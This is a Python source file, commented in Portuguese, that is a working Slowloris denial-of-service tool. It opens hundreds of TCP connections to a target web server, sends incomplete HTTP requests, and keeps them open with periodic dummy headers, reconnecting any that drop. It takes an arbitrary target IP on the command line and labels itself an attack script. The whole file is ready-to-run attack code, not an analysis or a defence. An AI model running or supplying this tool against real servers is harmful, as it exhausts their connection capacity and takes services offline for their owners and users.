# Author: Luiz G F Michelmann
# Date: 2026-08-26
# Version: 1.1
# Testado na versão 3.14 do python

import socket
import time
import sys
import signal

# Flag global para controle de interrupção
interromper = False

def handler_sigint(signum, frame):
    """Handler para Ctrl+C - sinaliza interrupção graciosa"""
    global interromper
    interromper = True
    print("\n[!] Ctrl+C detectado. Fechando conexões...")

# Registra o handler antes de qualquer outra coisa
signal.signal(signal.SIGINT, handler_sigint)

def fechar_sockets(sockets):
    """Fecha todas as conexões abertas de forma segura"""
    total = len(sockets)
    for i, s in enumerate(sockets[:], 1):
        try:
            # Envia um RST educado (fecha abruptamente)
            s.settimeout(1)
            s.close()
        except:
            pass
    print(f"[✓] {total} conexões fechadas.")

def slowloris(target, port, sockets_count, sleeptime):
    global interromper
    sockets = []
    
    try:
        # --- FASE 1: ABRIR CONEXÕES ---
        for i in range(sockets_count):
            if interromper:
                break
            
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                sockets.append(s)
                sys.stdout.write(f"\r[+] Conectando... {i+1}/{sockets_count}")
                sys.stdout.flush()
            except:
                pass
        
        print(f"\n[*] {len(sockets)} sockets ativos. Mantendo...")
        
        # --- FASE 2: MANTER CONEXÕES ---
        while len(sockets) > 0 and not interromper:
            for s in sockets[:]:
                try:
                    s.send(b"X-a: b\r\n")
                except:
                    sockets.remove(s)
            
            reconecta_se_necessario(sockets, target, port, sockets_count)
            
            # Mostra status
            status = f"[*] Sockets ativos: {len(sockets)}/{sockets_count}"
            print(f"{status}  (Ctrl+C para sair)")
            time.sleep(sleeptime)
    
    except KeyboardInterrupt:
        # KeyboardInterrupt cai aqui se o handler de signal não pegar
        interromper = True
        print("\n[!] Interrompido.")
    
    finally:
        # --- FASE 3: LIMPEZA GARANTIDA ---
        # Este bloco SEMPRE executa, com ou sem Ctrl+C
        print("\n[*] Limpando recursos...")
        fechar_sockets(sockets)
        print("[✓] Slowloris finalizado com sucesso.")


def reconecta_se_necessario(sockets, target, port, sockets_count):
    global interromper
    if interromper:
        return
    
    while len(sockets) < sockets_count:
        if interromper:
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(s)
        except:
            break


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 slowloris.py <IP> [porta] [sockets] [sleeptime]")
        print("Exemplo: python3 slowloris.py 192.168.1.100 80 500 10")
        sys.exit(1)
    
    TARGET = sys.argv[1]
    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    SOCKETS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
    SLEEPTIME = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    
    print(f"""
========================================
    Slowloris Attack Script (v2.0)
========================================
Target:     {TARGET}:{PORT}
Sockets:    {SOCKETS}
Sleeptime:  {SLEEPTIME} segundos
Ctrl+C:     Limpeza graciosa ✓
========================================
Pressione Ctrl+C para interromper a qualquer momento
""")
    
    slowloris(TARGET, PORT, SOCKETS, SLEEPTIME)
